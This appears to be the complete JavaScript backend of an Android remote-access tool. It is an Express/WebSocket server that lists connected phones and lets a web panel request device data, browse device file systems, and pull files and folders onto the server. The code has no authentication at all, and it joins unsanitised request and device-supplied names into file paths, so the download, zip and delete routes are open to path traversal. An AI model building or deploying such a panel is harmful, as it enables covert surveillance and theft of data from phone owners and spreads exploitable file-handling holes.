// Express + WebSocket backend to track connected Android devices

const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const path = require("path");
const fs = require("fs");
const archiver = require("archiver");
const { v4: uuidv4 } = require("uuid");
const downloadsManager = require("./downloadsManager");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Create downloads directory if it doesn't exist
const downloadsDir = path.join(__dirname, "public", "downloads");
if (!fs.existsSync(downloadsDir)) {
    fs.mkdirSync(downloadsDir, { recursive: true });
}

// Serve simple static web panel
app.use(express.static(path.join(__dirname, "public")));
app.use("/api", downloadsManager); // Routes will be available under /api/*

app.get("/downloads/:deviceId/:filename", (req, res) => {
    const { deviceId, filename } = req.params;
    const filePath = path.join(downloadsDir, deviceId, filename);

    if (!fs.existsSync(filePath)) {
        return res.status(404).send("File not found");
    }

    res.sendFile(filePath);
});

// In-memory map of devices
const devices = new Map(); // deviceId => { ws, lastSeen, online }

// In-memory map of active file transfers
const activeTransfers = new Map(); // transferId => { deviceId, type, path, chunks: {} }

// Broadcast device list to all panels
function broadcastDeviceList() {
    const panelData = Array.from(devices.entries()).map(([id, data]) => ({
        id,
        online: data.online,
        lastSeen: data.lastSeen
    }));

    wss.clients.forEach(client => {
        if (client.isPanel && client.readyState === WebSocket.OPEN) {
            client.send(
                JSON.stringify({ type: "deviceList", data: panelData })
            );
        }
    });
}

wss.on("connection", (ws, req) => {
    ws.isAlive = true;

    ws.on("pong", () => {
        ws.isAlive = true;
    });

    ws.on("message", msg => {
        try {
            const data = JSON.parse(msg);

            // Android client handshake
            if (data.type === "deviceConnect") {
                const { deviceId } = data;

                // Check if this device ID already exists in our map (might be offline)
                if (devices.has(deviceId)) {
                    // Update the existing device with new connection info
                    const existing = devices.get(deviceId);
                    existing.ws = ws;
                    existing.lastSeen = new Date().toISOString();
                    existing.online = true;
                    devices.set(deviceId, existing);
                } else {
                    // New device, add it to our map
                    devices.set(deviceId, {
                        ws,
                        lastSeen: new Date().toISOString(),
                        online: true
                    });
                }

                console.log(`[+] Device connected: ${deviceId}`);
                broadcastDeviceList();
            }

            if (data.type === "heartbeat") {
              console.log("HR")
    const { deviceId } = data;
    if (devices.has(deviceId)) {
        const existing = devices.get(deviceId);
        existing.lastSeen = new Date().toISOString();
        existing.online = true;
        devices.set(deviceId, existing);
        
        // Send heartbeat response back to the device immediately
        if (existing.ws && existing.ws.readyState === WebSocket.OPEN) {
            existing.ws.send(
                JSON.stringify({
                    type: "heartbeatResponse",
                    timestamp: Date.now()
                })
            );
            console.log(`[*] Sent heartbeat response to device: ${deviceId}`);
        } else {
            console.warn(`[!] Cannot send heartbeat response - WebSocket not open for device: ${deviceId}`);
        }
        
        broadcastDeviceList();
    } else {
        console.warn(`[!] Received heartbeat from unknown device: ${deviceId}`);
        
        // If we don't recognize the device, ask it to reconnect
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(
                JSON.stringify({
                    type: "reconnectRequest",
                    message: "Device not recognized, please reconnect"
                })
            );
        }
    }}

            // Panel connected
            if (data.type === "panelConnect") {
                ws.isPanel = true;
                console.log("[*] Web panel connected");
                broadcastDeviceList();
            }

            // Panel requested data from device
            if (data.type === "requestData") {
                const { targetId, dataType } = data;
                const device = devices.get(targetId);
                if (
                    device &&
                    device.ws &&
                    device.ws.readyState === WebSocket.OPEN
                ) {
                    device.ws.send(
                        JSON.stringify({
                            type: "requestData",
                            dataType: dataType
                        })
                    );
                }
            }

            // Panel requested file explorer action
            if (data.type === "fileExplorer") {
                const { targetId, action, path } = data;
                const device = devices.get(targetId);
                if (
                    device &&
                    device.ws &&
                    device.ws.readyState === WebSocket.OPEN
                ) {
                    device.ws.send(
                        JSON.stringify({
                            type: "fileExplorer",
                            action: action,
                            path: path
                        })
                    );
                }
            }

            // Panel requested file/folder download
            if (data.type === "fileDownload") {
                const { targetId, path, downloadType } = data;
                const requestId = uuidv4();
                const device = devices.get(targetId);

                if (
                    device &&
                    device.ws &&
                    device.ws.readyState === WebSocket.OPEN
                ) {
                    device.ws.send(
                        JSON.stringify({
                            type: "fileDownload",
                            requestId: requestId,
                            path: path,
                            downloadType: downloadType
                        })
                    );

                    // Notify all panels about the pending download
                    wss.clients.forEach(client => {
                        if (
                            client.isPanel &&
                            client.readyState === WebSocket.OPEN
                        ) {
                            client.send(
                                JSON.stringify({
                                    type: "fileDownloadStarted",
                                    requestId: requestId,
                                    deviceId: targetId,
                                    path: path,
                                    downloadType: downloadType,
                                    status: "pending"
                                })
                            );
                        }
                    });
                } else {
                    // Device not available
                    wss.clients.forEach(client => {
                        if (
                            client.isPanel &&
                            client.readyState === WebSocket.OPEN
                        ) {
                            client.send(
                                JSON.stringify({
                                    type: "fileDownloadError",
                                    requestId: requestId,
                                    deviceId: targetId,
                                    error: "Device is offline or not connected"
                                })
                            );
                        }
                    });
                }
            }

            // File transfer responses from device
            if (data.type === "fileTransferResponse") {
                const { action, deviceId, requestId, transferId } = data;

                // Process file transfer responses
                switch (action) {
                    case "metadata":
                        // Initialize file download
                        const { name, size, isDirectory, totalChunks } = data;

                        // Create directory for download if not exists
                        const deviceDownloadDir = path.join(
                            downloadsDir,
                            deviceId
                        );
                        if (!fs.existsSync(deviceDownloadDir)) {
                            fs.mkdirSync(deviceDownloadDir, {
                                recursive: true
                            });
                        }

                        // Create a placeholder file
                        const downloadPath = path.join(deviceDownloadDir, name);

                        // Store transfer info
                        activeTransfers.set(transferId, {
                            deviceId,
                            requestId,
                            path: downloadPath,
                            type: "file",
                            name,
                            size,
                            chunks: {},
                            receivedChunks: 0,
                            totalChunks
                        });

                        // Inform web panels
                        wss.clients.forEach(client => {
                            if (
                                client.isPanel &&
                                client.readyState === WebSocket.OPEN
                            ) {
                                client.send(
                                    JSON.stringify({
                                        type: "fileDownloadProgress",
                                        requestId,
                                        deviceId,
                                        transferId,
                                        name,
                                        size,
                                        progress: 0,
                                        status: "downloading"
                                    })
                                );
                            }
                        });
                        break;

                    case "chunk":
                        // Process a file chunk
                        const {
                            chunkIndex,
                            data: base64Data,
                            size: chunkSize
                        } = data;
                        const transfer = activeTransfers.get(transferId);

                        if (transfer) {
                            // Save chunk data
                            transfer.chunks[chunkIndex] = {
                                data: base64Data,
                                size: chunkSize
                            };
                            transfer.receivedChunks++;

                            // If we've received all chunks, write the file
                            if (
                                transfer.receivedChunks === transfer.totalChunks
                            ) {
                                writeCompleteFile(transfer);
                            }
                        }
                        break;

                    case "progress":
                        // Forward progress to web panels
                        wss.clients.forEach(client => {
                            if (
                                client.isPanel &&
                                client.readyState === WebSocket.OPEN
                            ) {
                                client.send(
                                    JSON.stringify({
                                        type: "fileDownloadProgress",
                                        requestId,
                                        deviceId,
                                        transferId,
                                        progress: data.progress,
                                        bytesTransferred: data.bytesTransferred,
                                        totalBytes: data.totalBytes,
                                        currentFile: data.currentFile
                                    })
                                );
                            }
                        });
                        break;

                    case "complete":
                        // File transfer completed
                        const completedTransfer =
                            activeTransfers.get(transferId);
                        if (completedTransfer) {
                            // Ensure all chunks are written
                            if (
                                completedTransfer.receivedChunks ===
                                completedTransfer.totalChunks
                            ) {
                                // File should be already written by now
                                // Just notify web panels
                                wss.clients.forEach(client => {
                                    if (
                                        client.isPanel &&
                                        client.readyState === WebSocket.OPEN
                                    ) {
                                        client.send(
                                            JSON.stringify({
                                                type: "fileDownloadComplete",
                                                requestId,
                                                deviceId,
                                                transferId,
                                                name: completedTransfer.name,
                                                path: `/downloads/${deviceId}/${completedTransfer.name}`,
                                                size: completedTransfer.size,
                                                status: "complete"
                                            })
                                        );
                                    }
                                });

                                // Clean up transfer data after some time
                                setTimeout(() => {
                                    activeTransfers.delete(transferId);
                                }, 60000);
                            }
                        }
                        break;

                    case "directoryMetadata":
                        // Initialize directory download
                        const {
                            name: dirName,
                            totalSize,
                            fileCount,
                            dirCount
                        } = data;

                        // Create directory for download
                        const deviceDirDownloadDir = path.join(
                            downloadsDir,
                            deviceId
                        );
                        if (!fs.existsSync(deviceDirDownloadDir)) {
                            fs.mkdirSync(deviceDirDownloadDir, {
                                recursive: true
                            });
                        }

                        const dirDownloadPath = path.join(
                            deviceDirDownloadDir,
                            dirName
                        );
                        if (!fs.existsSync(dirDownloadPath)) {
                            fs.mkdirSync(dirDownloadPath, { recursive: true });
                        }

                        // Store transfer info
                        activeTransfers.set(transferId, {
                            deviceId,
                            requestId,
                            path: dirDownloadPath,
                            type: "directory",
                            name: dirName,
                            totalSize,
                            fileCount,
                            dirCount,
                            processedFiles: 0,
                            processedDirs: 0,
                            bytesReceived: 0
                        });

                        // Inform web panels
                        wss.clients.forEach(client => {
                            if (
                                client.isPanel &&
                                client.readyState === WebSocket.OPEN
                            ) {
                                client.send(
                                    JSON.stringify({
                                        type: "fileDownloadProgress",
                                        requestId,
                                        deviceId,
                                        transferId,
                                        name: dirName,
                                        size: totalSize,
                                        fileCount,
                                        dirCount,
                                        progress: 0,
                                        status: "downloading"
                                    })
                                );
                            }
                        });
                        break;

                    case "directoryStructure":
                        // Create subdirectory
                        const { relativePath } = data;
                        const dirTransfer = activeTransfers.get(transferId);

                        if (dirTransfer) {
                            const subdirPath = path.join(
                                dirTransfer.path,
                                relativePath
                            );
                            if (
                                !fs.existsSync(subdirPath) &&
                                relativePath !== "."
                            ) {
                                fs.mkdirSync(subdirPath, { recursive: true });
                            }

                            // Update directory count
                            dirTransfer.processedDirs++;
                        }
                        break;

                    case "fileInDirectory":
                        // File metadata in directory, no action needed here
                        // Just track it for progress reporting
                        break;

                    case "directoryFileChunk":
                        // Process a file chunk within a directory
                        const {
                            relativePath: filePath,
                            chunkIndex: dirFileChunkIndex,
                            data: dirFileData,
                            size: dirFileChunkSize
                        } = data;

                        const dirFileTransfer = activeTransfers.get(transferId);

                        if (dirFileTransfer) {
                            // Create path to the file
                            const fileFullPath = path.join(
                                dirFileTransfer.path,
                                filePath
                            );
                            const fileDir = path.dirname(fileFullPath);

                            // Ensure directory exists
                            if (!fs.existsSync(fileDir)) {
                                fs.mkdirSync(fileDir, { recursive: true });
                            }

                            // Write chunk to file
                            const buffer = Buffer.from(dirFileData, "base64");

                            // If first chunk, create or overwrite the file
                            const flag = dirFileChunkIndex === 0 ? "w" : "a";

                            fs.writeFileSync(fileFullPath, buffer, { flag });

                            // Update bytes received
                            dirFileTransfer.bytesReceived += dirFileChunkSize;
                        }
                        break;

                    case "directoryFileComplete":
                        // A file in the directory transfer is complete
                        const dirCompletedTransfer =
                            activeTransfers.get(transferId);

                        if (dirCompletedTransfer) {
                            // Update file count
                            dirCompletedTransfer.processedFiles++;

                            // Calculate overall progress
                            const dirProgress =
                                (dirCompletedTransfer.bytesReceived /
                                    dirCompletedTransfer.totalSize) *
                                100;

                            // Update web panels
                            wss.clients.forEach(client => {
                                if (
                                    client.isPanel &&
                                    client.readyState === WebSocket.OPEN
                                ) {
                                    client.send(
                                        JSON.stringify({
                                            type: "fileDownloadProgress",
                                            requestId,
                                            deviceId,
                                            transferId,
                                            progress: Math.floor(dirProgress),
                                            bytesTransferred:
                                                dirCompletedTransfer.bytesReceived,
                                            totalBytes:
                                                dirCompletedTransfer.totalSize,
                                            processedFiles:
                                                dirCompletedTransfer.processedFiles,
                                            totalFiles:
                                                dirCompletedTransfer.fileCount,
                                            status: "downloading"
                                        })
                                    );
                                }
                            });
                        }
                        break;

                    case "directoryComplete":
                        // Directory transfer is complete
                        const dirTransferComplete =
                            activeTransfers.get(transferId);

                        if (dirTransferComplete) {
                            // Notify web panels
                            wss.clients.forEach(client => {
                                if (
                                    client.isPanel &&
                                    client.readyState === WebSocket.OPEN
                                ) {
                                    client.send(
                                        JSON.stringify({
                                            type: "fileDownloadComplete",
                                            requestId,
                                            deviceId,
                                            transferId,
                                            name: dirTransferComplete.name,
                                            path: `/downloads/${deviceId}/${dirTransferComplete.name}`,
                                            size: dirTransferComplete.totalSize,
                                            fileCount:
                                                dirTransferComplete.fileCount,
                                            status: "complete"
                                        })
                                    );
                                }
                            });

                            // Clean up transfer data after some time
                            setTimeout(() => {
                                activeTransfers.delete(transferId);
                            }, 60000);
                        }
                        break;

                    case "error":
                        // Handle errors
                        const { error } = data;

                        // Notify panels of error
                        wss.clients.forEach(client => {
                            if (
                                client.isPanel &&
                                client.readyState === WebSocket.OPEN
                            ) {
                                client.send(
                                    JSON.stringify({
                                        type: "fileDownloadError",
                                        requestId,
                                        deviceId,
                                        transferId,
                                        error
                                    })
                                );
                            }
                        });

                        // Clean up any transfer data
                        if (transferId && activeTransfers.has(transferId)) {
                            activeTransfers.delete(transferId);
                        }
                        break;
                }
            }

            // Device responded with data
            if (
                data.type === "dataResponse" ||
                data.type === "fileExplorerResponse"
            ) {
                // Forward to all panels
                wss.clients.forEach(client => {
                    if (
                        client.isPanel &&
                        client.readyState === WebSocket.OPEN
                    ) {
                        client.send(JSON.stringify(data));
                    }
                });
            }
        } catch (e) {
            console.error("Error parsing message:", e);
        }
    });

    ws.on("close", () => {
        for (const [deviceId, deviceData] of devices.entries()) {
            if (deviceData.ws === ws) {
                deviceData.online = false;
                deviceData.lastSeen = new Date().toISOString();
                console.log(`[-] Device disconnected: ${deviceId}`);
                broadcastDeviceList();
            }
        }
    });
});

// Add this to server.js
app.get("/downloadDirectory/:deviceId/:dirName", (req, res) => {
    const { deviceId, dirName } = req.params;
    const dirPath = path.join(downloadsDir, deviceId, dirName);

    if (!fs.existsSync(dirPath)) {
        return res.status(404).send("Directory not found");
    }

    // Set headers
    res.attachment(`${dirName}.zip`);

    // Create zip stream
    const archive = archiver("zip", {
        zlib: { level: 9 } // Compression level
    });

    // Pipe archive to response
    archive.pipe(res);

    // Add directory contents to zip
    archive.directory(dirPath, false);

    // Finalize archive
    archive.finalize();
});

app.post("/removeDownload", express.json(), (req, res) => {
    const { deviceId, name, downloadType } = req.body;

    if (!deviceId || !name) {
        return res.status(400).json({ error: "Missing required parameters" });
    }

    const itemPath = path.join(downloadsDir, deviceId, name);

    // Also find and cancel any active transfer
    const transferToCancel = [...activeTransfers.entries()].find(
        ([_, transfer]) =>
            transfer.deviceId === deviceId &&
            transfer.name === name &&
            transfer.type === downloadType
    );

    if (transferToCancel) {
        const [transferId] = transferToCancel;
        activeTransfers.delete(transferId);
        console.log(`[*] Cancelled active transfer: ${transferId}`);
    }

    try {
        if (fs.existsSync(itemPath)) {
            if (downloadType === "directory") {
                fs.rmSync(itemPath, { recursive: true, force: true });
            } else {
                fs.unlinkSync(itemPath);
            }
            return res.json({ success: true });
        } else {
            return res.status(200).json({ success: true }); // Treat as success even if not found
        }
    } catch (err) {
        console.error(`Error removing ${itemPath}:`, err);
        return res
            .status(500)
            .json({ error: "Failed to remove file or directory" });
    }
});

// Function to write a complete file from chunks
function writeCompleteFile(transfer) {
    try {
        // Create a write stream to the file
        const writeStream = fs.createWriteStream(transfer.path);

        // Write each chunk in order
        for (let i = 0; i < transfer.totalChunks; i++) {
            const chunk = transfer.chunks[i];
            if (chunk) {
                const buffer = Buffer.from(chunk.data, "base64");
                writeStream.write(buffer);
            }
        }

        // Close the stream
        writeStream.end();

        console.log(`[*] File download completed: ${transfer.path}`);

        // Clear chunks to free memory
        transfer.chunks = {};
    } catch (err) {
        console.error(`Error writing file ${transfer.path}:`, err);
    }
}

// Heartbeat cleanup
setInterval(() => {
    wss.clients.forEach(ws => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

// Clean up old transfers
setInterval(() => {
    const now = Date.now();
    for (const [transferId, transfer] of activeTransfers.entries()) {
        if (transfer.lastActivity && now - transfer.lastActivity > 3600000) {
            // 1 hour
            activeTransfers.delete(transferId);
        }
    }
}, 3600000); // Check every hour

const PORT = 8080;
server.listen(PORT, () =>
    console.log(`Backend listening on http://localhost:${PORT}`)
);
